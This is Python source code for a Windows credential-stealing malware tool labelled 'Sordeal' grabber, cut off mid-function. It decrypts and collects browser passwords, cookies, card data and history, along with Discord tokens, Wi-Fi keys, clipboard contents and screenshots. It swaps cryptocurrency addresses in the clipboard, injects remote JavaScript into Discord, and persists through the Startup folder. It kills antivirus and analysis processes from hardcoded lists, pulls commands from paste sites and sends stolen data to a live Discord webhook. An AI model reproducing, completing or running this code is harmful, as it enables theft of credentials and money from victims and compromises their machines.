import asyncio
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import base64
import requests
import ctypes
import time
import pyperclip
import win32gui
import win32con
import locale


from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData

#############################################################################################################################
############################################ Clean@Grab: v3 #################################################################
############################################ Clean@Author: https://github.com/ShamanOracle ##################################
############################################ Clean@Code: For Sordeal ########################################################
#############################################################################################################################

local = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
temp = os.getenv("TEMP")

NotPSSW = []


__config__ = {
    #Basic Options
    "SO_webhook": "https://discord.com/api/webhooks/1100150673481412780/jpfvH_H97CoZqyu3ialHFfDYw-Z3Nxx1roedsSpI7lFo3xcVx1Nn3N4oJun8EwIu9gzI",
    "SO_injection_url": "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",

    #Files Options
    "SO_getbrowsersfiles": "yes",
    "SO_getavfiles": "yes",
    "SO_getminecraft": "yes",
    "SO_getsysteme": "yes",
    "SO_getroblox": "yes",
    "SO_getscreenshot": "yes",
    "SO_getclipboard": "yes",
    "SO_getwifipassword": "yes",


    #Stealer Options
    "hide": "yes",
    "ping": "yes",
    "pingtype": "here",
    "fake_error": "no",
    "startup": "yes",
    "kill_discord_process": False,
    "SO_antidebug": False,
    "disabledefenderornot": "no",

    #Crypto Options
    "SO_crypto_fucker": "no",
    "SO_BTCADD": "",
    "SO_ETHADD": "",
    "SO_XCHADD": "",
    "SO_PCHADD": "",
    "SO_CCHADD": "",
    "SO_MONEADD": "",
    "SO_ADAADD": "",
    "SO_DASHADD": "",

    "blfirewall": [
        "MsMpEng",
        "cfp",
        "AvastSvc",
        "ccSvcHst",
        "mcshield",
        "vsmon",
        "avgfwsvc",
        "ashDisp",
        "avp",
        "MPFTray",
        "Outpost",
        "tinywall",
        "glasswire",
        "peerblock",
        "smc",
        "bdagent",
        "oaui",
        "pctfw",
        "pfw",
        "SPFConsole",
        "afwServ",
        "egui",
        "ndf",
        "avwsc",
        "fkp",
        "fsaua",
        "avktray",
        "rfwmain",
        "zlclient",
        "uiWinMgr",
        "WRSA",
        "mcuimgr",
        "avgnt",
        "sfmon",
        "zatray",
        "BavPro_Setup",
        "apwiz",
        "pfw7",
        "jpfsrv",
        "pztray",
        "isafe",
        "BullGuard",
        "PSUAMain",
        "SBAMSvc",
        "nlclientapp",
        "woservice",
        "op_mon",
        "WSClientservice",
        "wfc",
        "kicon",
        "avgtray",
        "npfmsg",
        "jpf",
        "WRSSSDK",
    ],
    "blprggg": [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver",
    ],
}


login_info = os.getlogin()
computer_victim = os.getenv("COMPUTERNAME")
fast_memory_storage = str(psutil.virtual_memory()[0] / 1024**3).split(".")[0]
storage_space = str(psutil.disk_usage("/")[0] / 1024**3).split(".")[0]

SO_myregex_secret = "https://paste.bingner.com/paste/32ymn/raw"
reg_req = requests.get(SO_myregex_secret)
regx_net = r"[\w-]{24}\." + reg_req.text



class Functions(object):
    @staticmethod
    def so_findClipboard():
        return subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode(errors= 'backslashreplace').strip()
    
    @staticmethod
    def so_findwifi():
        profiles = list()
        passwords = dict()

        for line in subprocess.run('netsh wlan show profile', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
            if 'All User Profile' in line:
                name= line[(line.find(':') + 1):].strip()
                profiles.append(name)
        
        for profile in profiles:
            found = False
            for line in subprocess.run(f'netsh wlan show profile "{profile}" key=clear', shell= True, capture_output= True).stdout.decode(errors= 'ignore').strip().splitlines():
                if 'Key Content' in line:
                    passwords[profile] = line[(line.find(':') + 1):].strip()
                    found = True
                    break
            if not found:
                passwords[profile] = '(None)'
        return passwords
    
    @staticmethod
    def time_convertion(time: int or float) -> str:
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def mykey_gtm(path: str or os.PathLike):
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            return Functions.decrypt_windows(master_key[5:])
        except KeyError:
            return None

    @staticmethod
    def files_creating(_dir: str or os.PathLike = gettempdir()):
        f1lenom = "".join(
            random.SystemRandom().choice(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            )
            for _ in range(random.randint(10, 20))
        )
        path = ntpath.join(_dir, f1lenom)
        open(path, "x")
        return path

    @staticmethod
    def header_making(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def decrypt_windows(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def info_sys() -> list:
        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            windows_uuid = (
                subprocess.check_output(sh1, creationflags=flag)
                .decode()
                .split("\n")[1]
                .strip()
            )
        except Exception:
            windows_uuid = "N/A"
        try:
            key_windows_find = (
                subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
            )
        except Exception:
            key_windows_find = "N/A"
        try:
            never_wind = (
                subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
            )
        except Exception:
            never_wind = "N/A"
        return [windows_uuid, never_wind, key_windows_find]

    @staticmethod
    def value_decrypt(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

    @staticmethod
    def find_in_config(e: str) -> str or bool | None:
        return __config__.get(e)
    
    @staticmethod
    def info_netword() -> list:
        ip, city, country, region, org, loc, googlemap = (
            "None",
            "None",
            "None",
            "None",
            "None",
            "None",
            "None",
        )
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get("ip")
            city = data.get("city")
            country = data.get("country")
            region = data.get("region")
            org = data.get("org")
            loc = data.get("loc")
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        return [ip, city, country, region, org, loc, googlemap]


class auto_copy_wallet(Functions):
    def __init__(self):
        self.address_st3aler = self.find_in_config("SO_crypto_fucker")
        self.address_btc = self.find_in_config("SO_BTCADD")
        self.address_eth = self.find_in_config("SO_ETHADD")
        self.address_xchain = self.find_in_config("SO_XCHADD")
        self.address_pchain = self.find_in_config("SO_PCHADD")
        self.address_cchain = self.find_in_config("SO_CCHADD")
        self.address_monero = self.find_in_config("SO_MONEADD")
        self.address_ada = self.find_in_config("SO_ADAADD")
        self.address_dash = self.find_in_config("SO_DASHADD")

    def address_swap(self):
        try:
            clipboard_data = pyperclip.paste()
            if re.search("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard_data):
                if clipboard_data not in [
                    self.address_btc,
                    self.address_eth,
                    self.address_xchain,
                    self.address_pchain,
                    self.address_cchain,
                    self.address_monero,
                    self.address_ada,
                    self.address_dash,
                ]:
                    if self.address_btc != "none" & self.address_btc != "":
                        pyperclip.copy(self.address_btc)
                        pyperclip.paste()
            if re.search("^0x[a-fA-F0-9]{40}$", clipboard_data):
                pyperclip.copy(self.address_eth)
                pyperclip.paste()
            if re.search(
                "^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$",
                clipboard_data,
            ):
                if self.address_xchain != "none" & self.address_xchain != "":
                    if clipboard_data not in [
                        self.address_btc,
                        self.address_eth,
                        self.address_xchain,
                        self.address_pchain,
                        self.address_cchain,
                        self.address_monero,
                        self.address_ada,
                        self.address_dash,
                    ]:
                        pyperclip.copy(self.address_xchain)
                        pyperclip.paste()
            if re.search(
                "^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$",
                clipboard_data,
            ):
                if self.address_pchain != "none" & self.address_pchain != "":
                    if clipboard_data not in [
                        self.address_btc,
                        self.address_eth,
                        self.address_xchain,
                        self.address_pchain,
                        self.address_cchain,
                        self.address_monero,
                        self.address_ada,
                        self.address_dash,
                    ]:
                        pyperclip.copy(self.address_pchain)
                        pyperclip.paste()
            if re.search(
                "^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$",
                clipboard_data,
            ):
                if self.address_cchain != "none" & self.address_cchain:
                    if clipboard_data not in [
                        self.address_btc,
                        self.address_eth,
                        self.address_xchain,
                        self.address_pchain,
                        self.address_cchain,
                        self.address_monero,
                        self.address_ada,
                        self.address_dash,
                    ]:
                        pyperclip.copy(self.address_cchain)
                        pyperclip.paste()
            if re.search("addr1[a-z0-9]+", clipboard_data):
                if clipboard_data not in [
                    self.address_btc,
                    self.address_eth,
                    self.address_xchain,
                    self.address_pchain,
                    self.address_cchain,
                    self.address_monero,
                    self.address_ada,
                    self.address_dash,
                ]:
                    pyperclip.copy(self.address_ada)
                    pyperclip.paste()
            if re.search("/X[1-9A-HJ-NP-Za-km-z]{33}$/g", clipboard_data):
                if self.address_dash != "none" & self.address_dash != "":
                    if clipboard_data not in [
                        self.address_btc,
                        self.address_eth,
                        self.address_xchain,
                        self.address_pchain,
                        self.address_cchain,
                        self.address_monero,
                        self.address_ada,
                        self.address_dash,
                    ]:
                        pyperclip.copy(self.address_dash)
                        pyperclip.paste()
            if re.search("/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g", clipboard_data):
                if self.address_monero != "none" & self.address_monero != "":
                    if clipboard_data not in [
                        self.address_btc,
                        self.address_eth,
                        self.address_xchain,
                        self.address_pchain,
                        self.address_cchain,
                        self.address_monero,
                        self.address_ada,
                        self.address_dash,
                    ]:
                        pyperclip.copy(self.address_monero)
                        pyperclip.paste()
        except:
            data = None

    def loop_through(self):
        while True:
            self.address_swap()

    def run(self):
        if self.address_st3aler == "yes":
            self.loop_through()


class first_function_bc(Functions):
    def __init__(self):

        self.thingstocount = {
            'Cooks' : 0,
            'Pssw' : 0,
            'CC' : 0,
            'Hist' : 0,
            'Disco_info' : 0,
            'Rblx_Cooks' : 0,
            'Minecraft' : 0,
            'Wifi' : 0
        }

        self.dscap1 = "https://discord.com/api/v9/users/@me"

        self.discord_webhook = self.find_in_config("SO_webhook")

        self.hide = self.find_in_config("hide")

        self.disablemydefender = self.find_in_config("disabledefenderornot")

        self.pingtype = self.find_in_config("pingtype")

        self.pingonrun = self.find_in_config("ping")

        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.startupexe = self.find_in_config("startup")

        self.fake_error = self.find_in_config("fake_error")


        self.ineedtogetbrowsers = self.find_in_config("SO_getbrowsersfiles")

        self.ineedtogetav = self.find_in_config("SO_getavfiles")

        self.ineedtogetmc = self.find_in_config("SO_getminecraft")

        self.ineedtogetsys = self.find_in_config("SO_getsysteme")

        self.ineedtogetrblx = self.find_in_config("SO_getroblox")

        self.ineedtogetscreen = self.find_in_config("SO_getscreenshot")

        self.ineedtogetclipboard = self.find_in_config("SO_getclipboard")
        
        self.ineedtogetwifipassword = self.find_in_config("SO_getwifipassword")


        self.appdata = os.getenv("localappdata")

        self.roaming = os.getenv("appdata")

        self.chrmmuserdtt = ntpath.join(self.appdata, "Google", "Chrome", "User Data")

        self.dir, self.temp = mkdtemp(), gettempdir()

        inf, net = self.info_sys(), self.info_netword()



        self.SO_mycommand_secret = "https://paste.bingner.com/paste/fyqvp/raw"
        self.secretcommand = requests.get(self.SO_mycommand_secret)
        self.command_disable = f"{self.secretcommand}"

        self.somycommandforextract = "https://paste.bingner.com/paste/8pudp/raw"
        self.thereqresp = requests.get(self.somycommandforextract)
        self.thecommand = self.thereqresp.text

        self.windows_uuid, self.never_wind, self.key_windows_find = (
            inf[0],
            inf[1],
            inf[2],
        )

        (
            self.ip,
            self.city,
            self.country,
            self.region,
            self.org,
            self.loc,
            self.googlemap,
        ) = (net[0], net[1], net[2], net[3], net[4], net[5], net[6])

        self.srtupl0c = ntpath.join(
            self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )

        self.regex_webhook_dsc = "api/webhooks"

        self.chrmrgx = re.compile(
            r"(^profile\s\d*)|default|(guest profile$)", re.IGNORECASE | re.MULTILINE
        )

        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.regex = regx_net

        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []

        self.SO_id = []

        self.sep = os.sep

        self.robloxcookies = []

        self.chrome_key = self.mykey_gtm(ntpath.join(self.chrmmuserdtt, "Local State"))

        os.makedirs(self.dir, exist_ok=True)

    def remoter_SO_err(self: str) -> str:
        if self.fake_error == "yes":
            ctypes.windll.user32.MessageBoxW(
                None,
                "Error code: Windows_0x786542\nSOmething gone wrong.",
                "Fatal Error",
                0,
            )
    def ping_on_running(self: str) -> str:
        ping1 = {
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "content": "@everyone",
        }
        ping2 = {
            "avatar_url": "https://raw.githubusercontent.com/Sordeal/Assets/main/sordeal.png",
            "content": "@here",
        }
        if self.pingonrun == "yes":
            if self.regex_webhook_dsc in self.discord_webhook:
                if self.pingtype == "@everyone" or self.pingtype == "everyone":
                    httpx.post(self.discord_webhook, json=ping1)
            if self.pingtype == "@here" or self.pingtype == "here":
                if self.regex_webhook_dsc in self.discord_webhook:
                    httpx.post(self.discord_webhook, json=ping2)

    def startup_so(self: str) -> str:
        if self.startupexe == "yes":
            startup_path = (
                os.getenv("appdata")
                + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            )
            if os.path.exists(startup_path + argv[0]):
                os.remove(startup_path + argv[0])
                copy2(argv[0], startup_path)
            else:
                copy2(argv[0], startup_path)

    def hide_so(self: str) -> str:
        if self.hide == "yes":
            hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hide, win32con.SW_HIDE)

    def SO_exit_this(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def extract_try(func):
        """Decorator to safely catch and ignore exceptions"""

        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass

        return wrapper
             

    def getlange(self: str) -> str:
        language = "KSCH_"
        pc_code = locale.getdefaultlocale()[0]

        if pc_code == "fr_FR":
          language = "FR_"
        if pc_code == "ar-SA":
          language = "AR_"
        if pc_code == "bg-BG":
          language = "BU_"
        if pc_code == "ca-ES":
          language = "CA_"
        if pc_code == "zh-TW":
          language = "CH_"
        if pc_code == "cs-CZ":
          language = "CZ_"
        if pc_code == "da-DK":
          language = "DA_"
        if pc_code == "de-DE":
          language = "GE_"
        if pc_code == "el-GR":
          language = "GR_"
        if pc_code == "en-US":
          language = "US_"
        if pc_code == "es-ES":
          language = "SP_"
        if pc_code == "fi-FI":
          language = "FIN_"
        if pc_code == "he-IL":
          language = "HEB_"
        if pc_code == "hu-HU":
          language = "HUN_"
        if pc_code == "is-IS":
          language = "ICE_"
        if pc_code == "it-IT":
          language = "IT_"
        if pc_code == "ja-JP":
          language = "JA_"
        if pc_code == "ko-KR":
          language = "KO_"
        if pc_code == "nl-NL":
          language = "DU_"
        if pc_code == "nb-NO":
          language = "NORW_"
        if pc_code == "pl-PL":
          language = "POL_"
        if pc_code == "pt-BR":
          language = "BR_"
        if pc_code == "rm-CH":
          language = "RH_RO_"
        if pc_code == "ro-RO":
          language = "ROM_"
        if pc_code == "ru-RU":
          language = "RU_"
        if pc_code == "hr-HR":
          language = "CRO_"
        if pc_code == "sk-SK":
          language = "SLOV_"
        if pc_code == "sq-AL":
          language = "ALB_"
        if pc_code == "sv-SE":
          language = "SWE_"
        if pc_code == "th-TH":
          language = "THAI_"
        if pc_code == "tr-TR":
          language = "TURK_"
        if pc_code == "ur-PK":
          language = "UR_PAK_"
        if pc_code == "id-ID":
          language = "IND_"
        if pc_code == "uk-UA":
          language = "UKR_"
        if pc_code == "be-BY":
          language = "BELA_RU_"
        if pc_code == "sl-SI":
          language = "SLOVE_"
        if pc_code == "et-EE":
          language = "EST_"
        if pc_code == "lv-LV":
          language = "LATV_"
        if pc_code == "lt-LT":
          language = "LITH_"
        if pc_code == "tg-Cyrl-TJ":
          language = "TAJIK_"
        if pc_code == "fa-IR":
          language = "PERS_"
        if pc_code == "vi-VN":
          language = "VIET_"
        if pc_code == "hy-AM":
          language = "ARM_"
        if pc_code == "az-Latn-AZ":
          language = "AZERI_"
        if pc_code == "eu-ES":
          language = "BASQUE_"
        if pc_code == "wen-DE":
          language = "SORB_"
        if pc_code == "mk-MK":
          language = "MACE_"
        if pc_code == "st-ZA":
          language = "SUTU_"
        if pc_code == "ts-ZA":
          language = "TSO_"
        if pc_code == "tn-ZA":
          language = "TSA_"
        if pc_code == "ven-ZA":
          language = "VEND_"
        if pc_code == "ven-ZA":
          language = "XH_"
        if pc_code == "zu-ZA":
          language = "ZU_"
        if pc_code == "af-ZA":
          language = "AFR_"
        if pc_code == "ka-GE":
          language = "GEO_"
        if pc_code == "fo-FO":
          language = "FARO_"
        if pc_code == "hi-IN":
          language = "HINDI_"
        if pc_code == "mt-MT":
          language = "MAL_"
        if pc_code == "se-NO":
          language = "SAMI_"
        if pc_code == "gd-GB":
          language = "GAELIC_"
        if pc_code == "yi":
          language = "YI_"
        if pc_code == "ms-MY":
          language = "MALAY_"
        if pc_code == "kk-KZ":
          language = "KAZAKH_"
        if pc_code == "ky-KG":
          language = "CYR_"
        if pc_code == "sw-KE":
          language = "SWA_"
        if pc_code == "tk-TM":
          language = "TURKMEN_"
        if pc_code == "uz-Latn-UZ":
          language = "UZBEK_"
        if pc_code == "tt-RU":
          language = "TATAR_"
        if pc_code == "bn-IN":
          language = "BENG_"
        if pc_code == "pa-IN":
          language = "PUN_"
        if pc_code == "gu-IN":
          language = "GUJ_"
        if pc_code == "or-IN":
          language = "ORIYA_"
        if pc_code == "ta-IN":
          language = "TAMIL_"
        if pc_code == "te-IN":
          language = "TELUGU_"
        if pc_code == "kn-IN":
          language = "KAN_"
        if pc_code == "ml-IN":
          language = "MAL_"
        if pc_code == "as-IN":
          language = "ASSA_"
        if pc_code == "mr-IN":
          language = "MARA"
        if pc_code == "sa-IN":
          language = "SAN_"
        if pc_code == "mn-MN":
          language = "MONG_"
        if pc_code == "bo-CN":
          language = "TIB_"
        if pc_code == "cy-GB":
          language = "WELSH_"
        if pc_code == "km-KH":
          language = "KHMER_"
        if pc_code == "lo-LA":
          language = "LAO"
        if pc_code == "my-MM":
          language = "BUR_"
        if pc_code == "gl-ES":
          language = "GALI_"
        if pc_code == "kok-IN":
          language = "KONK_"
        if pc_code == "mni":
          language = "MANI_"
        if pc_code == "sd-IN":
          language = "SINDHI_"
        if pc_code == "syr-SY":
          language = "SYR_"
        if pc_code == "si-LK":
          language = "SIN_"
        if pc_code == "chr-US":
          language = "CHE_"
        if pc_code == "iu-Cans-CA":
          language = "INU_"
        if pc_code == "fr-015":
          language = "FR_"
        if pc_code == "es-419":
          language = "ESP_"
        if pc_code == "es-US":
          language = "ESP_"
        if pc_code == "es-PR":
          language = "ESP_"
        if pc_code == "es-NI":
          language = "ESP_"
        if pc_code == "es-HN":
          language = "ESP_"
        if pc_code == "en-SG":
          language = "ESP_"
        if pc_code == "es-SV":
          language = "ESP_"
        if pc_code == "en-MY":
          language = "MALAY_"
        if pc_code == "es-BO":
          language = "ESP_"
        if pc_code == "en-IN":
          language = "IND_"
        if pc_code == "ar-QA":
          language = "AR_"
        if pc_code == "fr-HT":
          language = "FR_"
        
        return language
    




    async def init(self):
        self.browsers = {
            "amigo": self.appdata + "\\Amigo\\User Data",
            "torch": self.appdata + "\\Torch\\User Data",
            "kometa": self.appdata + "\\Kometa\\User Data",
            "orbitum": self.appdata + "\\Orbitum\\User Data",
            "cent-browser": self.appdata + "\\CentBrowser\\User Data",
            "7star": self.appdata + "\\7Star\\7Star\\User Data",
            "sputnik": self.appdata + "\\Sputnik\\Sputnik\\User Data",
            "vivaldi": self.appdata + "\\Vivaldi\\User Data",
            "google-chrome-sxs": self.appdata + "\\Google\\Chrome SxS\\User Data",
            "google-chrome": self.appdata + "\\Google\\Chrome\\User Data",
            "epic-privacy-browser": self.appdata + "\\Epic Privacy Browser\\User Data",
            "microsoft-edge": self.appdata + "\\Microsoft\\Edge\\User Data",
            "uran": self.appdata + "\\uCozMedia\\Uran\\User Data",
            "yandex": self.appdata + "\\Yandex\\YandexBrowser\\User Data",
            "brave": self.appdata + "\\BraveSoftware\\Brave-Browser\\User Data",
            "iridium": self.appdata + "\\Iridium\\User Data",
            "edge": self.appdata + "\\Microsoft\\Edge\\User Data",
        }
        self.profiles = [
            "Default",
            "Profile 1",
            "Profile 2",
            "Profile 3",
            "Profile 4",
            "Profile 5",
        ]

        if self.discord_webhook == "" or self.discord_webhook == "\x57EBHOOK_HERE":
            self.SO_exit_this()
        
        self.hide_so()
        self.so_please_disabledefender()
        self.remoter_SO_err()
        self.startup_so()

        if self.find_in_config("SO_antidebug") and NoDebugg().inVM is True:
            self.SO_exit_this()
        await self.bypass_bttdsc()
        await self.bypass_tokenprtct()

        if self.ineedtogetsys == "yes":
            os.makedirs(ntpath.join(self.dir, "Systeme"), exist_ok=True)

        if self.ineedtogetrblx == "yes":
            os.makedirs(ntpath.join(self.dir, "Roblox"), exist_ok=True)
        function_list = [
            self.screentimes,
            self.getmywifiSordeal,
            self.getmyclipboard,
            self.so_please_getmyAV,
            self.system_informations,
            self.find_bctoken,
            self.mc_find,
            self.find_roblox,
        ]

        if self.find_in_config("kill_discord_process") is True:
            await self.kill_process_id()
        if self.ineedtogetbrowsers == "yes":
            os.makedirs(ntpath.join(self.dir, "Browsers"), exist_ok=True)
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            self.masterkey = self.mykey_gtm(path + "\\Local State")
            self.funcs = [
                self.steal_cookies2,
                self.steal_history2,
                self.steal_mypassword2,
                self.steal_cc2,
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
            os.makedirs(ntpath.join(self.dir, "Google"), exist_ok=True)
            function_list.extend(
                [self.steal_passwords, self.steal_cookies, self.steal_history]
            )
        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.natify_matched_tokens()
        await self.disco_injection()
        self.ping_on_running()
        self.finished_bc()

    async def disco_injection(self):
        for _dir in os.listdir(self.appdata):
            if "discord" in _dir.lower():
                discord = self.appdata + os.sep + _dir
                for __dir in os.listdir(ntpath.abspath(discord)):
                    if re.match(r"app-(\d*\.\d*)*", __dir):
                        app = ntpath.abspath(ntpath.join(discord, __dir))
                        modules = ntpath.join(app, "modules")

                        if not ntpath.exists(modules):
                            return
                        for ___dir in os.listdir(modules):
                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                inj_path = (
                                    modules
                                    + os.sep
                                    + ___dir
                                    + f"\\discord_desktop_core\\"
                                )

                                if ntpath.exists(inj_path):
                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(
                                                inj_path + "SORDEAL", exist_ok=True
                                            )
                                        except PermissionError:
                                            pass
                                    if self.regex_webhook_dsc in self.discord_webhook:
                                        f = httpx.get(
                                            self.find_in_config("SO_injection_url")
                                        ).text.replace(
                                            "%WEBHOOK%", self.discord_webhook
                                        )
                                    try:
                                        with open(
                                            inj_path + "index.js", "w", errors="ignore"
                                        ) as indexFile:
                                            indexFile.write(f)
                                    except PermissionError:
                                        pass
                                    if self.find_in_config("kill_discord_process"):
                                        os.startfile(app + self.sep + _dir + ".exe")

    async def bypass_tokenprtct(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not ntpath.exists(tp):
            return
        config = tp + "config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp + i)
            except FileNotFoundError:
                pass
        if ntpath.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item["SORDEAL_is_here"] = "https://github.com/Sordeal"
                item["auto_start"] = False
                item["auto_start_discord"] = False
                item["integrity"] = False
                item["integrity_allowbetterdiscord"] = False
                item["integrity_checkexecutable"] = False
                item["integrity_checkhash"] = False
                item["integrity_checkmodule"] = False
                item["integrity_checkscripts"] = False
                item["integrity_checkresource"] = False
                item["integrity_redownloadhashes"] = False
                item["iterations_iv"] = 364
                item["iterations_key"] = 457
                item["version"] = 69420
            with open(config, "w") as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, "a") as f:
                f.write("\n\n//Shaman_is_here | https://github.com/Sordeal")

    async def kill_process_id(self):
        bllist = self.find_in_config("blprggg")
        blfirewalllist = self.find_in_config("blfirewall")

        for i in [
            "discord",
            "discordtokenprotector",
            "discordcanary",
            "discorddevelopment",
            "discordptb",
        ]:
            bllist.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in bllist):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blfirewalllist):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    async def bypass_bttdsc(self):
        bd = self.roaming + "\\BetterDiscord\\data\\betterdiscord.asar"
        if ntpath.exists(bd):
            x = self.regex_webhook_dsc
            with open(bd, "r", encoding="cp437", errors="ignore") as f:
                txt = f.read()
                content = txt.replace(x, "SHAMANgot")
            with open(bd, "w", newline="", encoding="cp437", errors="ignore") as f:
                f.write(content)

    @extract_try
    def value_dcrypt(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def MasterKey_find(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def find_bctoken(self):
        paths = {
            "Discord": self.roaming + "\\discord\\Local Storage\\leveldb\\",
            "Discord Canary": self.roaming
            + "\\discordcanary\\Local Storage\\leveldb\\",
            "Lightcord": self.roaming + "\\Lightcord\\Local Storage\\leveldb\\",
            "Discord PTB": self.roaming + "\\discordptb\\Local Storage\\leveldb\\",
            "Opera": self.roaming
            + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
            "Opera GX": self.roaming
            + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
            "Amigo": self.appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
            "Torch": self.appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
            "Kometa": self.appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
            "Orbitum": self.appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
            "CentBrowser": self.appdata
            + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
            "7Star": self.appdata
            + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
            "Sputnik": self.appdata
            + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
            "Vivaldi": self.appdata
            + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome SxS": self.appdata
            + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
            "Chrome": self.appdata
            + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
            "Chrome1": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
            "Chrome2": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
            "Chrome3": self.appdata
            + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
            "Chrome4": self.appdata
